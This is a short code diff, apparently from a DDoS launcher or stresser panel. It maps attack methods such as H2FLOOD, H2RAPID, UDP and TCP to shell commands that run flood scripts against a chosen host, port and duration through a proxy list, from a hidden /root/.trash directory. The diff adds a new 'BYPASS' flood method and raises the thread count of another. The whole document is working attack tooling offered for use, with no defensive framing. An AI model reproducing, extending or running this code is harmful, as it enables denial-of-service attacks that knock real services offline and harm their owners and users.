@@ -15,6 +15,7 @@ const methods = {
     H2GECKO: 'H2GECKO.js',
     H2RAPID: 'H2RAPID.js',
     H2FLOOD: 'H2FLOOD.js',
+    BYPASS: 'BYPASS.js',
     UDP: 'udp.c',
     TCP: 'tcp.c'
 };
@@ -37,8 +38,10 @@ const generateCommand = (method, host, port, time) => {
             return `cd /root/.trash && node STATRUM.js ${host} ${time} 32 2 proxy.txt`;
         case 'H2CIKO':
             return `cd /root/.trash && node H2CIKO.js ${host} ${time} 4 64 proxy.txt`;
+        case 'BYPASS':
+            return `cd /root/.trash && node BYPASS.js ${host} ${time} 8 5 proxy.txt`;
         case 'H2FLASH':
-            return `cd /root/.trash && node H2FLASH.js ${host} ${time} 8 2 proxy.txt`;
+            return `cd /root/.trash && node H2FLASH.js ${host} ${time} 8 8 proxy.txt`;
         case 'H2GECKO':
             return `cd /root/.trash && node H2GECKO.js ${host} ${time} 32 2 proxy.txt`;
         case 'H2RAPID':
